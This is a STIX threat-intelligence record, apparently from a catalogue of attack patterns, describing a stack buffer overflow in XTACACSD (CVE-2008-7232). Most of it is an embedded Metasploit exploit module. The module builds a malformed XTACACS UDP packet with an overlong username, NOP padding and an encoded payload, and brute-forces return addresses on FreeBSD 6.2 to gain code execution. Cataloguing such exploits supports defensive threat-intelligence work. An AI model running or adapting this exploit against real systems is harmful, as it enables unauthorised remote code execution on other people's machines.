{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ebf9ceca-2e8c-4dc0-8cfd-bc3887456f42",
    "created": "2024-08-14T16:33:38.072529Z",
    "modified": "2024-08-14T16:33:38.072533Z",
    "name": "XTACACSD report() Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in XTACACSD <= 4.1.2. By sending a specially crafted XTACACS packet with an overly long username, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/tacacs/xtacacsd_report.rb",
            "external_id": "xtacacsd_report.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-7232"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/xtacacsdz-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'XTACACSD report() Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in XTACACSD <= 4.1.2. By\n        sending a specially crafted XTACACS packet with an overly long\n        username, an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          ['CVE', '2008-7232'],\n          ['OSVDB', '58140'],\n          ['URL', 'http://aluigi.altervista.org/adv/xtacacsdz-adv.txt'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 175,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x83\\xec\\x7f\",\n          'DisableNops'   =>  'True',\n        },\n      'Platform'       => 'bsd',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['FreeBSD 6.2-Release Bruteforce',\n            {'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0xbfbfea00 },\n                'Stop'  => { 'Ret' => 0xbfbfef00 },\n                'Step'  => 24,\n              }\n            },\n          ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-01-08'))\n\n    register_options([Opt::RPORT(49)])\n  end\n\n  def brute_exploit(address)\n    connect_udp\n\n    sploit =  \"\\x80\" # Version\n    sploit << \"\\x05\" # Type: Connect\n    sploit << \"\\xff\\xff\" # Nonce\n    sploit << \"\\xff\" # Username length\n    sploit << \"\\x00\" # Password length\n    sploit << \"\\x00\" # Response\n    sploit << \"\\x00\" # Reason\n    sploit << \"\\xff\\xff\\xff\\xff\" # Result 1\n    sploit << \"\\xff\\xff\\xff\\xff\" # Destination address\n    sploit << \"\\xff\\xff\" # Destination port\n    sploit << \"\\xff\\xff\" # Line\n    sploit << \"\\x00\\x00\\x00\\x00\" # Result 2\n    sploit << \"\\x00\\x00\" # Result 3\n    sploit << make_nops(238 - payload.encoded.length)\n    sploit << payload.encoded + [address['Ret']].pack('V')\n\n    print_status(\"Trying target #{target.name} #{\"%.8x\" % address['Ret']}...\")\n    udp_sock.put(sploit)\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-08",
    "x_mitre_platforms": [
        "bsd'"
    ]
}